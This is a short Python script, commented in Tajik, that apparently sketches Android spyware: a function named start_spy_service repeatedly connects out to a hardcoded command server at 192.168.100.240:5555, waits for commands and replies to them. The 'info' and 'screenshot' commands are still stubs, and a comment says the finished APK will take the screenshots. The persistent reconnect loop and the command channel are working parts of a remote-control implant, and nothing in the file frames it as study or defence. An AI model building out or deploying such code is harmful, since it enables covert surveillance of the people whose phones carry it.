import socket
import time
import os

# IP-и компютери ту
SERVER_IP = '192.168.100.240'
PORT = 5555

def start_spy_service():
    while True:
        try:
            # Кӯшиши пайваст шудан ба Маркази Фармондеҳии Ҳабиб
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((SERVER_IP, PORT))
            
            while True:
                # Гӯш кардани фармон
                command = s.recv(1024).decode()
                
                if not command:
                    break

                if command == "info":
                    # Маълумоти системавӣ
                    info = "Модел: Android/Linux aarch64 | Статус: Актив"
                    s.send(info.encode())
                
                elif command == "screenshot":
                    # Дар APK-и финалӣ ин ҷо сурат мегирад
                    s.send("[!] Скриншот дар ҳоли омодасозӣ...".encode())
                
                else:
                    s.send("[?] Фармон қабул шуд, сервер мунтазир аст.".encode())
                    
        except Exception as e:
            # Агар алоқа канда шавад ё интернет набошад, 10 сония интизор мешавем
            time.sleep(10)
            continue

if __name__ == "__main__":
    # Ин қисм барои он аст, ки Android фаҳмад ин Service аст
    from multiprocessing import Process
    p = Process(target=start_spy_service)
    p.start()